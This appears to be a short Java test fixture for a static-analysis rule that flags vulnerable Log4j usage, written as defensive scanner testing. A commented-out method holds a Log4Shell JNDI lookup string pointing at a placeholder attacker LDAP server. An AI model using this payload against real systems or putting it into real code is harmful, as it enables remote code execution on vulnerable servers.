import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Foo {
  // bearer:expected java_lang_log4j
  private static final Logger LOGGER = LogManager.getLogger(Foo.class);

  // public static void bad() {
  //   LOGGER.info("${jndi:ldap://attacker-server:1389/Exploit}");
  // }

  public static void bad2() {
    LOGGER.info("outdated version of log4j vulnerability");
  }
}